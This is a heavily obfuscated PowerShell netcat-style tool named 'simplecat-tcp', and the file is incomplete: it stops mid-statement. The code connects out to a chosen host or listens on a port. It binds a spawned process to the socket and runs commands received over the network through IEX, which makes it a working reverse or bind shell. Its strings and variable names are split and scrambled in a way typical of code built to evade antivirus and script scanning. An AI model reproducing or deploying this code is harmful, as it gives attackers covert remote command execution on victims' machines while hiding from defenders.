function simplecat-tcp
{
  param(  
    [alias(  {"{0}{1}" -f'Clie','nt'} )][string]${C}  ="",
    [alias({"{0}{1}"-f'List','en'}  )][switch]${L}  =${fAl`se},
    [alias({"{0}{1}" -f'P','ort'} )][Parameter( Position  =-1)][string]${P} =  "",
    [alias({"{2}{1}{0}"-f'cute','e','Ex'}  )][string]${e}=  "",
    [alias( {"{4}{3}{1}{2}{0}"-f 'shell','u','tePower','ec','Ex'}  )][switch]${ep}= ${fa`Lse},
    [alias({"{0}{1}" -f'Rel','ay'} )][string]${r}="",
    [alias({"{0}{2}{1}" -f'Time','t','ou'} )][int32]${T}= 60,
    [Parameter(ValueFromPipeline  =${tr`UE})][alias( {"{1}{0}"-f'ut','Inp'}  )]${i}  =  ${n`UlL},
    [ValidateSet({"{0}{1}" -f 'H','ost'}, {"{0}{1}"-f'Byte','s'}, {"{2}{0}{1}"-f 'rin','g','St'} )][alias( {"{1}{0}{2}" -f'putTyp','Out','e'})][string]${O}  = ("{0}{1}" -f'Hos','t'  ),
    [alias( {"{0}{1}{2}" -f 'OutputF','i','le'}  )][string]${of}=  "",
    [alias(  {"{2}{1}{0}{3}"-f 'nn','co','Dis','ect'})][switch]${d}  = ${f`ALSE},
    [alias({"{1}{0}"-f 'r','Repeate'}  )][switch]${R`eP} =${f`A`lsE},
    [alias( {"{3}{2}{1}{4}{0}" -f'd','n','e','G','eratePayloa'}  )][switch]${G}  =  ${f`A`LsE},
    [alias( {"{2}{1}{0}" -f'nerateEncoded','e','G'} )][switch]${G`E}  =${F`Al`SE},
    [alias( {"{1}{0}"-f'p','Hel'}  )][switch]${H}=${F`ALSE}
  )
  
  
  
  ${G`lOB`Al:VE`R`Bose}   =  ${V`ErB`oSE}
  if(${OF} -ne ''){${O}   =   ( "{0}{1}" -f 'Byte','s')}
  if(  ${D`NS} -eq "" )
  {
    if(  ( (  ${c} -eq "" ) -and (  !${l}  ) ) -or (  ( ${c} -ne "") -and ${l} )  ){return (  (  ( "{6}{1}{17}{4}{16}{10}{14}{3}{7}{5}{8}{11}{12}{13}{0}{2}{15}{9}" -f 'e','u',' ','-c','st sele',' ','Yo',')','or li',').',' either clie','ste','n ','mod','nt mode (','(-l','ct',' mu'  ) ) )}
    if(${p} -eq ""  ){return ("{0}{1}{5}{2}{4}{3}{6}" -f 'Please p','rovide','a ','ort num','p',' ','ber to -p.' )}
  }
  if(  (  ((  ${r} -ne "" ) -and (${E} -ne "" )) -or ( (  ${E} -ne "") -and ( ${E`P}) )  ) -or  ((  ${r} -ne "") -and ( ${e`p})  ) ){return ( "{6}{2}{9}{0}{4}{8}{10}{1}{5}{11}{3}{7}"-f' p',' of these: -e','nl',' ','ick ',', ','You can o','-r','o','y','ne','-ep,'  )}
  if((${i} -ne ${N`UlL}) -and ((  ${R} -ne ""  ) -or ( ${E} -ne ""))  ){return ("{4}{3}{2}{5}{8}{0}{7}{1}{6}"-f 'plica','e her','is','i ','-',' no','e.','bl','t ap')}
  if(${L}  )
  {
    ${fai`lurE}   = ${Fa`l`se}
    netstat -na |   Select-String LISTENING   | % {if(  (${_}.ToString(  ).split( ":")[1].split(  " "  )[0]) -eq ${p}){Write-Output (  (  "{3}{2}{0}{1}" -f 'cted po','rt ','e sele','Th' )  +   ${P}  +   (  "{4}{2}{3}{1}{0}"-f 'se.','in u','is alr','eady ',' '))  ;   ${FA`i`lURE}=${T`RuE}}}
    if(  ${FA`iLurE}){break}
  }
  if(${r} -ne ""  )
  {
    if( ${R}.split( ":" ).Count -eq 2 )
    {
      ${f`AIluRe} =   ${FaL`Se}
      netstat -na   |  Select-String LISTENING | % {if(  (  ${_}.ToString( ).split(":" )[1].split(" "  )[0]  ) -eq ${R}.split( ":"  )[1] ){Write-Output (( "{1}{0}{5}{3}{4}{2}"-f' s','The','rt ','ecte','d po','el' )  + ${r}.split( ":"  )[1] +  ("{1}{3}{0}{2}"-f'lready in',' is',' use.',' a')  ) ;   ${fa`IlU`Re}  =${TR`Ue}}}
      if( ${fAIl`U`RE} ){break}
    }
  }
  
  
 
  
  function Setup_TCP
  {
    param(${FUncsEtUP`V`A`RS} )
    ${C},${L},${p},${T}  =   ${FUncS`e`TUP`VaRS}
    if(  ${g`L`oBA`L`:VeRBOsE}  ){${V`eRbo`Se}  =   ${tR`UE}}
    ${FUncVA`Rs} =   @{}
    if(!${l})
    {
      ${fU`NCv`ARs}["l"]  =  ${f`AlSe}
      ${SoCk`eT} =   New-Object System.Net.Sockets.TcpClient
      Write-Verbose ( "{2}{0}{1}"-f'nec','ting...','Con' )
      ${HANd`lE}   = ${S`Oc`kEt}.BeginConnect(  ${C},${P},${nu`lL},${n`ULl}  )
    }
    else
    {
      ${F`UNC`VaRS}["l"]   =   ${t`RUe}
      Write-Verbose ( (  (  (  "{1}{4}{2}{3}{7}{0}{6}{5}"-f'0.0.0] (p','Lis','ning ','on [0','te',' ','ort','.' ) ))   + ${p}  + ")")
      ${SO`CKeT} = New-Object System.Net.Sockets.TcpListener ${P}
      ${sOC`kET}.Start( )
      ${hAND`Le}   =   ${s`O`cket}.BeginAcceptTcpClient(  ${n`ULL}, ${nu`LL} )
    }
    
    ${St`OpWA`Tch}   = [System.Diagnostics.Stopwatch]::StartNew( )
    while( ${Tr`UE}  )
    {
      if(${H`ost}.UI.RawUI.KeyAvailable  )
      {
        if(  @(17,27 ) -contains (${HO`ST}.UI.RawUI.ReadKey(( "{5}{4}{0}{2}{3}{6}{7}{1}" -f'e','udeKeyUp','K','ey','lud','NoEcho,Inc','Down,','Incl')).VirtualKeyCode) )
        {
          Write-Verbose (  "{11}{7}{6}{2}{0}{10}{5}{9}{3}{1}{4}{8}" -f'ESC c',' TCP',' ','ng',' Setu','t.','r','L o','p...',' Stoppi','augh','CTR'  )
          if(${Fu`Ncva`Rs}["l"]  ){${soC`kET}.Stop(   )}
          else{${So`C`ket}.Close(    )}
          ${st`O`pwatCh}.Stop(    )
          break
        }
      }
      if(${s`T`opWatCH}.Elapsed.TotalSeconds -gt ${T}  )
      {
        if(!${l}){${SO`Ck`eT}.Close(  )}
        else{${soC`k`ET}.Stop( )}
        ${S`T`opwAtCH}.Stop(  )
        Write-Verbose ( "{0}{1}{2}"-f 'Timeo','ut','!')  ;  break
        break
      }
      if(${h`A`NDLe}.IsCompleted )
      {
        if(  !${l} )
        {
          try
          {
            ${S`OCk`Et}.EndConnect(${hAN`Dle}  )
            ${S`Tre`AM}   =   ${S`ocKet}.GetStream()
            ${Bu`FF`E`RsIzE}  = ${SO`cKeT}.ReceiveBufferSize
            Write-Verbose (  (  "{4}{3}{2}{1}{0}" -f 'ion to ','nect','n','o','C')   +  ${c} +   ":"  +  ${P}  + ( "{2}{0}{5}{4}{1}{3}" -f'tcp] s','e',' [','d!','ceed','uc'  ) )
          }
          catch{${S`o`CKet}.Close()  ;   ${StOP`wa`TCh}.Stop(  ) ;   break}
        }
        else
        {
          ${CL`iE`NT}  =   ${S`OcK`Et}.EndAcceptTcpClient( ${H`AndLE} )
          ${stRE`AM} =   ${cl`i`Ent}.GetStream(  )
          ${BufF`ER`sIZe}   =  ${c`L`Ient}.ReceiveBufferSize
          Write-Verbose (  ( "{1}{3}{0}{2}{4}" -f 'ctio','C','n from ','onne','[')   + ${ClI`E`NT}.Client.RemoteEndPoint.Address.IPAddressToString +   ( "{0}{1}" -f'] port',' '  ) +  ${PO`Rt} + ( (  (  "{1}{3}{2}{5}{4}{0}" -f'port ',' [tc',' ','p]','rce ','accepted (sou') ) )  +  ${cLI`enT}.Client.RemoteEndPoint.Port  + ")" )
        }
        break
      }
    }
    ${sto`PWAT`Ch}.Stop(  )
    if( ${SO`c`KeT} -eq ${Nu`lL}){break}
    ${funcvA`RS}[("{0}{1}" -f 'Stre','am')]   =   ${sT`RE`AM}
    ${fU`Nc`VaRS}[( "{1}{0}"-f 'ocket','S' )]   = ${S`ocKeT}
    ${Fu`Nc`VARS}[( "{2}{1}{0}" -f'ize','S','Buffer' )] =   ${B`UFf`ErsiZe}
    ${FuN`cV`ARs}[( "{3}{1}{2}{4}{5}{6}{0}" -f 'er','t','reamDestina','S','tion','Bu','ff' )]  =   ( New-Object System.Byte[] ${fuN`CVa`RS}[(  "{1}{2}{0}"-f'ze','Buffer','Si')]  )
    ${f`UNCVArS}[("{3}{0}{4}{1}{2}"-f'O','ti','on','StreamRead','pera'  )]   = ${fUnC`VA`RS}[("{2}{0}{1}"-f'e','am','Str')].BeginRead(  ${F`UnCvars}[("{3}{2}{4}{5}{1}{0}"-f'onBuffer','estinati','r','St','ea','mD'  )], 0, ${fUNc`V`ArS}[(  "{2}{1}{0}" -f 'e','ferSiz','Buf' )], ${N`Ull}, ${n`Ull}  )
    ${F`UNC`VarS}[("{1}{0}{2}"-f'n','E','coding'  )]  =   New-Object System.Text.AsciiEncoding
    ${FuNc`V`Ars}[(  "{0}{1}{2}" -f 'StreamB','yte','sRead')]   =   1
    return ${Fu`N`cvARS}
  }
  function ReadData_TCP
  {
    param(${F`UNcV`ArS} )
    ${D`Ata}   =  ${n`Ull}
    if(  ${F`UN`C`VArs}[(  "{3}{2}{1}{4}{0}" -f'd','amBytes','tre','S','Rea' )] -eq 0){break}
    if( ${fU`N`CVARs}[(  "{1}{0}{3}{5}{4}{2}" -f 'trea','S','n','mReadO','atio','per'  )].IsCompleted)
    {
      ${s`TR`eAMby`T`ESre`Ad}  =   ${fUNcv`A`RS}[(  "{1}{0}" -f 'am','Stre'  )].EndRead( ${fUN`c`VARs}[("{3}{2}{4}{1}{0}{5}" -f'ra','e','a','Stre','mReadOp','tion'  )] )
      if(  ${sTrEaMByTe`S`Re`AD} -eq 0 ){break}
      ${D`AtA}   =  ${Fu`NC`Vars}[(  "{5}{6}{3}{0}{2}{4}{1}" -f'n','uffer','ation','sti','B','St','reamDe' )][0..(  [int]${sTR`EAMbYTES`R`EaD}-1  )]
      ${F`UNCvA`RS}[(  "{1}{0}{3}{2}{4}" -f 'Op','StreamRead','a','er','tion')]  =   ${fuN`cV`ArS}[("{0}{1}" -f 'St','ream'  )].BeginRead( ${f`U`N`CVArS}[("{1}{0}{5}{4}{3}{2}{6}" -f 't','S','onBu','nati','i','reamDest','ffer' )], 0, ${fU`Nc`VARs}[("{3}{2}{1}{0}"-f'ze','Si','r','Buffe' )], ${N`ULL}, ${NU`LL} )
    }
    return ${d`AtA},${f`U`NC`VArs}
  }
  function WriteData_TCP
  {
    param( ${dA`TA},${FUnCv`A`Rs}  )
    ${f`UncVars}[("{0}{1}" -f 'Str','eam')].Write( ${D`ATA}, 0, ${d`ATa}.Length )
    return ${f`Unc`VaRs}
  }
  function Close_TCP
  {
    param(${F`UNCV`ARs}  )
    try{${fUn`Cva`Rs}[(  "{2}{1}{0}" -f 'm','trea','S')].Close(  )}
    catch{}
    if(  ${fun`c`Vars}["l"]){${fUn`CVArS}[("{0}{1}{2}" -f 'So','cke','t')].Stop(  )}
    else{${F`Un`CvArs}[("{1}{0}" -f'et','Sock')].Close(  )}
  }
  
  
  
  function Setup_CMD
  {
    param(  ${f`U`NCSeTupV`ArS})
    if( ${GLob`AL:V`eRBoSe}){${v`ErbO`SE}  = ${tR`UE}}
    ${F`UNc`V`ARs} =   @{}
    ${proCe`ssst`AR`TinfO}  =  New-Object System.Diagnostics.ProcessStartInfo
    ${pRoC`esS`STaR`TiNFO}.FileName  =  ${F`UnCSET`Upv`ARS}[0]
    ${process`Sta`Rt`InFo}.UseShellExecute = ${FaL`Se}
    ${PROCEs`SSta`R`T`INFo}.RedirectStandardInput  =   ${tR`UE}
    ${prOC`e`s`ssT`ArtINfO}.RedirectStandardOutput   =   ${Tr`Ue}
    ${pr`OC`e`ss`stA`RtINfo}.RedirectStandardError  =  ${tr`Ue}
    ${FUNcv`ARs}[("{1}{0}" -f 'rocess','P' )]  =  [System.Diagnostics.Process]::Start(${p`R`oc`e`sSsTArTInfo}  )
    Write-Verbose ( (  "{1}{3}{0}{2}"-f'ng Proces','Star','s ','ti')   +   ${fu`NcSet`UP`Va`Rs}[0]   +  "..."  )
    ${F`U`NCVARs}[("{0}{1}"-f'P','rocess' )].Start() | Out-Null
    ${fuN`CV`ArS}[( "{0}{2}{3}{4}{1}"-f 'St','tionBuffer','dOu','tDest','ina' )]  = New-Object System.Byte[] 65536
    ${FunC`V`ArS}[( "{3}{1}{0}{2}{4}{5}" -f'eadO','R','perat','StdOut','i','on' )]  =   ${F`U`NCvA`RS}[(  "{1}{0}{2}" -f 'roc','P','ess')].StandardOutput.BaseStream.BeginRead(  ${fU`NCV`ArS}[( "{6}{5}{7}{1}{4}{0}{3}{2}" -f 'Buff','ati','r','e','on','tdOu','S','tDestin' )], 0, 65536, ${nU`lL}, ${N`ULL})
    ${FUNc`VARs}[(  "{0}{4}{2}{1}{3}" -f 'StdErrDes','ion','at','Buffer','tin' )]   =   New-Object System.Byte[] 65536
    ${fUnc`VA`RS}[( "{2}{0}{4}{1}{5}{3}" -f'R','adOp','StdErr','n','e','eratio')]   = ${f`UnCvaRs}[("{0}{2}{1}"-f'P','ocess','r'  )].StandardError.BaseStream.BeginRead( ${fUNC`Va`RS}[("{7}{3}{1}{0}{2}{4}{5}{6}" -f's','e','tina','rD','tionBuf','fe','r','StdEr')], 0, 65536, ${N`ULl}, ${nu`ll} )
    ${F`UnC`VARs}[("{2}{1}{0}" -f 'ding','co','En'  )] = New-Object System.Text.AsciiEncoding
    return ${f`UNCV`ArS}
  }
  function ReadData_CMD
  {
    param(  ${Fu`N`CvA`Rs}  )
    [byte[]]${d`AtA} = @()
    if( ${funC`V`A`RS}[("{0}{4}{3}{2}{1}" -f 'StdO','dOperation','a','Re','ut')].IsCompleted  )
    {
      ${S`T`DouTBytE`SrEaD}   = ${F`UnCva`RS}[("{0}{1}{2}" -f 'P','roc','ess')].StandardOutput.BaseStream.EndRead(${Fu`Nc`VArs}[( "{3}{0}{2}{1}{4}"-f 'tdOutR','atio','eadOper','S','n'  )]  )
      if(${s`TD`oU`TbYtESREAD} -eq 0 ){break}
      ${DA`TA} += ${fu`Nc`VarS}[( "{2}{4}{0}{1}{5}{6}{3}" -f 's','t','StdOu','r','tDe','in','ationBuffe'  )][0..( [int]${Stdo`UtB`yTeSrE`AD}-1 )]
      ${f`UNc`VA`RS}[(  "{5}{3}{1}{4}{0}{2}"-f'ra','adO','tion','OutRe','pe','Std')]   =   ${fUn`CVA`Rs}[( "{2}{1}{0}"-f'ss','e','Proc' )].StandardOutput.BaseStream.BeginRead(  ${fUnCV`A`Rs}[(  "{2}{7}{4}{0}{5}{1}{6}{3}"-f 'Destin','onB','S','ffer','dOut','ati','u','t' )], 0, 65536, ${N`ULL}, ${n`Ull})
    }
    if(  ${f`UNcV`ARS}[( "{0}{1}{4}{3}{2}"-f 'StdEr','rRea','n','eratio','dOp'  )].IsCompleted)
    {
      ${stDERrb`yte`sRE`AD} =  ${FU`NCv`Ars}[( "{1}{2}{0}" -f 'ss','Pro','ce')].StandardError.BaseStream.EndRead( ${fu`NcVARs}[(  "{1}{3}{5}{4}{0}{2}"-f'atio','StdEr','n','rR','dOper','ea'  )])
      if(${stDe`Rrby`TEsRe`Ad} -eq 0 ){break}
      ${D`AtA} += ${f`U`NcvaRS}[(  "{0}{5}{3}{4}{1}{2}"-f 'S','nation','Buffer','rr','Desti','tdE' )][0..([int]${s`Td`ERrB`YTESread}-1 )]
      ${fU`N`C`Vars}[( "{0}{3}{1}{2}{4}" -f'StdErrRe','dOpe','ra','a','tion'  )]  = ${F`Unc`VArS}[("{2}{0}{1}" -f'roces','s','P'  )].StandardError.BaseStream.BeginRead(${fU`Nc`Va`RS}[(  "{2}{6}{4}{5}{3}{1}{0}"-f'r','e','StdErrDes','uff','atio','nB','tin' )], 0, 65536, ${n`UlL}, ${nU`LL}  )
    }
    return ${d`Ata},${f`U`Ncv`ARS}
  }
  function WriteData_CMD
  {
    param( ${d`Ata},${F`UncvA`RS})
    ${FuNc`V`ArS}[("{2}{0}{1}"-f'ce','ss','Pro')].StandardInput.WriteLine(  ${FuNC`V`ARS}[(  "{2}{1}{0}"-f'g','codin','En')].GetString(  ${da`TA}  ).TrimEnd("`r"  ).TrimEnd( "`n") )
    return ${FunC`V`A`Rs}
  }
  function Close_CMD
  {
    param(${F`U`NCvArs})
    ${F`U`NcvaRs}[("{0}{1}{2}" -f 'Pro','c','ess' )]   |  Stop-Process
  }  
  
  
  
function Main_Powershell
{
    param(${s`T`Re`A`m1seT`UpvARS})   
    try
    {
        ${Enc`o`DIng}   =   New-Object System.Text.AsciiEncoding
        [byte[]]${inPUtt`O`wr`ITE}  = @()
        if(  ${I} -ne ${nU`ll})
        {
            Write-Verbose (  "{4}{1}{0}{2}{3}" -f 'put','n',' from -','i detected...','I'  )
            if(  Test-Path ${i} ){ [byte[]]${In`pUt`TowR`iTe} = ( [io.file]::ReadAllBytes( ${I} )  ) }
            elseif(  ${I}.GetType( ).Name -eq (  "{1}{0}" -f'yte[]','B'  )){ [byte[]]${in`PUtTo`wrI`TE} =   ${i} }
            elseif(  ${i}.GetType( ).Name -eq ( "{2}{0}{1}"-f'rin','g','St'  ) ){ [byte[]]${inpUt`TowR`ITe}  =   ${eN`cO`dIng}.GetBytes(${I} ) }
            else{Write-Host ("{4}{1}{0}{5}{3}{2}" -f 'ogn','c',' type.','nput','Unre','ised i')  ;  return}
        }
    
        Write-Verbose (  ("{3}{2}{4}{7}{0}{6}{5}{1}" -f 'p ','to exit)','ng','Setti',' ','am 1... (ESC/CTRL ','Stre','u'  ) )
        try{${ST`Ream`1VaRs}   =  Stream1_Setup ${sT`R`eA`M1SetUPv`ArS}}
        catch{Write-Verbose ("{3}{1}{2}{0}{4}"-f '1 Setu','tream',' ','S','p Failure' )   ;   return}
      
        Write-Verbose ("{9}{4}{5}{11}{10}{7}{6}{2}{1}{0}{3}{8}"-f'.. ','eam 2.','r','(ESC/CTRL to exi','e','tt',' St','p','t)','S',' u','ing')
        try
        {
            ${r`E`mOt`ehoSTN`AmE} =  (Invoke-Command -ScriptBlock { hostname }  )
            ${i`NTrOp`R`oMPT} =   ${enc`Od`iNG}.GetBytes((  "`n`n " + 'Co'+'nnect' +  'ed '+'to'  +  ' '  +  "$RemoteHostName " + "`n`n "+  'Hi'  +  't '+  'Ent' + 'er' + ' '+  'to'  +  ' '+  'con' +'ti' + 'nue'  +  '... ' +  "`n`n" )  )
            ${c`OMM`AN`dt`oExecu`Te}   =   ""      
            ${d`Ata} =   ${NU`ll}
        }
        catch
        {
            Write-Verbose (  "{4}{2}{0}{1}{3}" -f 'u','p ','tream 2 Set','Failure','S' )  ; return
        }
      
        if(${INp`U`TTOW`RiTe} -ne @( ) )
        {
            Write-Verbose (  "{6}{0}{1}{2}{4}{5}{3}" -f'ing i','nput to St','re','...','am ','1','Writ' )
            try{${S`Tre`AM1va`RS}  =   Stream1_WriteData ${Inp`UTToW`RI`Te} ${s`TrEaM1Va`Rs}}
            catch{Write-Host ( "{0}{1}{2}{3}{4}{6}{5}" -f 'Failed',' to wri','te',' ','input to',' 1',' Stream'  ) ; return}
        }
      
        if(  ${d}  ){Write-Verbose ( "{0}{9}{5}{8}{10}{3}{1}{7}{6}{2}{4}"-f '-d (dis','ed','Disconnecting..','at','.','t)',' ','.',' A','connec','ctiv'  ) ;   return}
      
        Write-Verbose (  "{4}{13}{14}{12}{7}{11}{1}{5}{9}{6}{10}{2}{3}{8}{0}" -f' Streams...','s E','ire','cting Da','Bo','stab','sh','tion Str','ta Between','li','ed. Red','eam','unica','th C','omm'  )
        while(  ${t`RuE} )
        {        
        Start-Sleep -Milliseconds 10
            try
            {
                
                ${prOm`pt}   = ${nU`ll}
                ${Retur`N`eDDAtA} =  ${NU`LL}
                if(  ${coMManDtoEx`eC`U`TE} -ne "")
                {
                    try{[byte[]]${ret`UR`NEdd`ATA}  = ${enCO`d`iNg}.GetBytes( (IEX ${CO`m`MaNDT`O`exE`cUTE} 2>&1 |  Out-String))}
                    catch{[byte[]]${Re`TuRneD`DA`TA}   =  ${en`CODinG}.GetBytes( ( ${_}  |  Out-String ) )}
                    ${Pr`o`MPT} =   ${E`NcOd`i`Ng}.GetBytes( ( ("[$RemoteHostName] "+'PS' +' '+ '' )   + ( pwd).Path +   "> "  ) )
                }
                ${d`ATa} += ${In`Tr`O`PROmpt}
                ${INtR`op`ROM`Pt}   = ${N`ULL}
                ${D`ATA} += ${Re`T`UrNEDdaTA}
                ${DA`Ta} += ${Pr`OMPt}
                ${CoMM`AN`dTOExEc`U`TE}  = ""
                

                if(  ${D`Ata} -ne ${n`ULL}){${ST`REAM`1v`Ars}  = Stream1_WriteData ${D`ATA} ${s`TReaM1`VArS}}
                ${da`Ta} =   ${n`UlL}
            }
            catch
            {
                Write-Verbose (  "{1}{4}{8}{0}{10}{9}{11}{7}{2}{6}{3}{12}{5}" -f't da','Fail','tr','m ','ed to ','am 1','ea','S','redirec',' fro','ta','m ','2 to Stre'  )   ;   return
            }
        
            try
            {
                ${D`ATA},${S`TR`EaM1`Vars}  = Stream1_ReadData ${sT`R`EaM1VARs}
                if(  ${da`TA}.Length -eq 0 ){Start-Sleep -Milliseconds 200}
                if(  ${dA`Ta} -ne ${n`ULL}){${C`Om`M`ANDtOE`xecUTE}   = ${ENCod`i`Ng}.GetString(  ${d`Ata}  )}
                ${d`ATA}   = ${n`UlL}
            }
            catch
            {
                Write-Verbose ( "{3}{0}{9}{1}{6}{10}{5}{7}{11}{2}{8}{4}" -f 'ile','to redi','tream','Fa','2','ream 1 t','rect data','o ',' ','d ',' from St','S'  ) ; return
            }
        }
    }
    finally
    {
        try
        {
            Write-Verbose ( "{0}{1}{3}{4}{2}{5}"-f 'Cl','os',' 1.','ing',' Stream','..')
            Stream1_Close ${sTrEam1`V`ARS}
        }
        catch
        {
            Write-Verbose ("{4}{0}{1}{2}{3}"-f'iled to c','lose S','tream',' 1','Fa'  )
        }
    }
}

  

  
  function Setup_Console
  {
    param( ${FuN`Cs`eTuPv`A`RS}  )
    ${fu`NcvarS} = @{}
    ${fuNc`V`ArS}[( "{2}{0}{1}" -f'o','ding','Enc' )] =   New-Object System.Text.AsciiEncoding
    ${FU`NCv`ArS}[( "{0}{2}{1}" -f 'O','ut','utp')]   =   ${FUncSET`U`P`VARS}[0]
    ${fUnCV`ARs}[("{0}{2}{3}{1}"-f 'O','utBytes','ut','p'  )] = [byte[]]@( )
    ${FU`Nc`VarS}[("{3}{1}{2}{0}" -f'g','tputStr','in','Ou'  )] =  ""
    return ${f`UnCV`ArS}
  }
  function ReadData_Console
  {
    param( ${fUncV`Ars}  )
    ${dA`Ta}   =   ${N`ULL}
    if( ${HO`sT}.UI.RawUI.KeyAvailable )
    {
      ${da`TA} =   ${FuN`cv`ARs}[( "{2}{0}{1}"-f'n','coding','E')].GetBytes(  (  Read-Host  )  +   "`n" )
    }
    return ${d`ATa},${f`UNcVa`RS}
  }
  function WriteData_Console
  {
    param( ${d`ATA},${fUN`c`V`Ars} )
    switch( ${FUn`cv`A`Rs}[( "{0}{1}"-f 'Ou','tput'  )]  )
    {
      ( "{0}{1}"-f 'H','ost'  ) {Write-Host -n ${F`Unc`VarS}[( "{0}{1}"-f'E','ncoding'  )].GetString( ${dA`TA} )}
      ( "{1}{0}{2}" -f 'n','Stri','g'  ) {${func`V`ARs}[(  "{2}{3}{0}{1}"-f'ri','ng','Outpu','tSt')] += ${FU`N`C`Vars}[("{1}{0}{2}"-f'i','Encod','ng'  )].GetString( ${dA`Ta}  )}
      ("{0}{1}"-f'Byte','s'  ) {${fUnc`VA`RS}[( "{1}{2}{0}{3}" -f 'te','Ou','tputBy','s')] += ${d`ATa}}
    }
    return ${fU`Nc`Vars}
  }
  function Close_Console
  {
    param(${fu`N`CvARs}  )
    if(  ${fu`N`cvARS}[(  "{0}{1}{2}" -f 'Ou','tputStrin','g' )] -ne ""  ){return ${F`U`NcVARS}[("{1}{2}{3}{0}"-f'g','O','utput','Strin')]}
    elseif(${f`UNcva`RS}[( "{1}{0}{2}" -f 'utByte','Outp','s')] -ne @( )  ){return ${fU`NCv`Ars}[( "{2}{0}{1}"-f 'utByt','es','Outp'  )]}
    return
  }
  
  
  
  function Main
  {
    param(${S`TrE`AM1SE`TUp`VArS},${S`TREA`m`2SeTupvArs}  )
    try
    {
      [byte[]]${in`PuTtowRi`Te}  = @(  )
      ${ENCO`DinG}  = New-Object System.Text.AsciiEncoding
      if(${I} -ne ${N`Ull}  )
      {
        Write-Verbose ( "{2}{0}{3}{4}{1}" -f't from','tected...','Inpu',' -','i de' )
        if(  Test-Path ${i}){ [byte[]]${In`p`UtToWrite}  =  (  [io.file]::ReadAllBytes( ${I}  )) }
        elseif(${I}.GetType(   ).Name -eq ( "{1}{0}" -f'e[]','Byt'  )  ){ [byte[]]${INPutTO`WR`ite}  = ${i} }
        elseif( ${I}.GetType(   ).Name -eq ("{0}{1}"-f'Strin','g')  ){ [byte[]]${Inp`UT`ToWrite}   = ${En`co`DIng}.GetBytes(  ${I} ) }
        else{Write-Host ( "{0}{1}{3}{2}{5}{4}"-f'Unr','e','s','cogni','input type.','ed ' )   ;   return}
      }
      
      Write-Verbose ( "{1}{0}{3}{2}" -f 'etting up ','S','...','Stream 1'  )
      try{${stRe`A`m1vArS}   = Stream1_Setup ${sT`ReaM1`set`UP`VaRS}}
      catch{Write-Verbose (  "{0}{3}{1}{4}{2}" -f 'St','1','p Failure','ream ',' Setu' )  ;   return}
      
      Write-Verbose ( "{1}{3}{4}{0}{2}"-f 'g ','S','up Stream 2...','e','ttin')
      try{${STrE`Am2`V`Ars}   =  Stream2_Setup ${StrE`AM2set`Upv`ARS}}
      catch{Write-Verbose ("{4}{0}{2}{1}{5}{3}" -f 'r',' Setup ','eam 2','ailure','St','F')   ;  return}
      
      ${d`Ata}  =  ${NU`lL}
      
      if( ${iNPUT`TOW`R`Ite} -ne @( ) )
      {
        Write-Verbose ( "{8}{4}{0}{3}{5}{2}{7}{1}{6}" -f't','.','rea','o','ut ',' St','..','m 1','Writing inp')
        try{${stR`E`A`m1VARs}   =  Stream1_WriteData ${In`puTtOw`R`I`Te} ${S`TRea`M1va`RS}}
        catch{Write-Host (  "{0}{4}{3}{2}{6}{1}{5}" -f 'Fa','m ','np','i','iled to write ','1','ut to Strea' )   ;  return}
      }
      
      if(  ${d}){Write-Verbose (( "{7}{0}{6}{2}{5}{9}{4}{10}{3}{1}{8}"-f 'disco','g','nect) Ac','tin','ted. Disc','t','n','-d (','...','iva','onnec' ))  ; return}
      
      Write-Verbose ( "{2}{4}{10}{15}{5}{3}{1}{12}{7}{9}{8}{14}{16}{0}{13}{6}{11}"-f' Strea','tr','Bo','ion S','th ','at','s..',' Established. Re','re','di','Communi','.','eams','m','cting Data Betwee','c','n'  )
      while(  ${t`RUE}  )
      {
        try
        {
          ${Da`Ta},${S`TrEaM2Va`Rs}   =   Stream2_ReadData ${Str`eAM`2v`ArS}
          if( (${d`Ata}.Length -eq 0) -or (${Da`Ta} -eq ${NU`LL})){Start-Sleep -Milliseconds 100}
          if(  ${D`ATA} -ne ${n`Ull}){${S`TrEAm`1VARs}   =   Stream1_WriteData ${da`Ta} ${S`TrEA`M1VARS}}
          ${Da`TA} =  ${N`ULl}
        }
        catch
        {
          Write-Verbose (  "{2}{12}{10}{7}{11}{0}{9}{3}{5}{4}{13}{1}{8}{6}" -f ' ','ream','Fail','a','from Stream 2 to ','ta ','1','to redire',' ','d',' ','ct','ed','St')  ; return
        }
        
        try
        {
          ${D`AtA},${St`Re`A`M1vARs} = Stream1_ReadData ${s`TrE`AM1vA`RS}
          if(  (${DA`Ta}.Length -eq 0 ) -or (${d`ATa} -eq ${N`UlL}  )  ){Start-Sleep -Milliseconds 100}
          if(  ${Da`Ta} -ne ${NU`LL} ){${STREA`m`2`Vars}   =  Stream2_WriteData ${Da`TA} ${s`TreAm`2vA`RS}}
          ${da`Ta}   =  ${n`ULl}
        }
        catch
        {
          Write-Verbose ("{0}{10}{6}{11}{2}{3}{12}{7}{5}{1}{4}{9}{8}{13}"-f'Faile','om Stream 1','c','t d',' to ','r','r','a f','a','Stre','d to ','edire','at','m 2'  )   ; return
        }
      }
    }
    finally
    {
      try
      {
        
        Stream2_Close ${s`TReAM`2vaRs}
      }
      catch
      {
        Write-Verbose ("{2}{5}{1}{3}{0}{4}"-f 'Str','o close','Failed ',' ','eam 2','t'  )
      }
      try
      {
        
        Stream1_Close ${S`T`Ream1`Vars}
      }
      catch
      {
        Write-Verbose (  "{5}{2}{3}{0}{4}{1}"-f'close','1','t','o ',' Stream ','Failed ')
      }
    }
  }
  
  
 
    Write-Verbose (  "{1}{0}{5}{3}{4}{2}"-f't','Se','P','tre','am 1: TC',' S'  )
    ${F`Un`cT`IONsTrI`NG}  = (  "function Stream1_Setup`n{`n"   +  ${function:Setup_TCP} +  "`n}`n`n"  )
    ${fU`NcTIons`TR`INg} += (  "function Stream1_ReadData`n{`n"  +   ${function:ReadData_TCP} + "`n}`n`n" )
    ${F`UNctiO`NsTrIng} += ("function Stream1_WriteData`n{`n"  +  ${function:WriteData_TCP}  + "`n}`n`n"  )
    ${fuNctI`o`Ns`TRING} += ( "function Stream1_Close`n{`n"  +   ${function:Close_TCP}   +   "`n}`n`n")
    if(  ${L}){${i`NVokESTR`iNg} =   (  'Main'+  ' ' +"@('',`$True,$p,$t) "+'')}
    else{${i`N`VO`Ke`StrInG}   =  ('Mai'+  'n '+"@('$c',`$False,$p,$t) "+  ''  )}

  
  if(  ${e} -ne "" )
  {
    Write-Verbose ( "{5}{4}{2}{0}{3}{1}"-f'P','ss',' ','roce',':','Set Stream 2' )
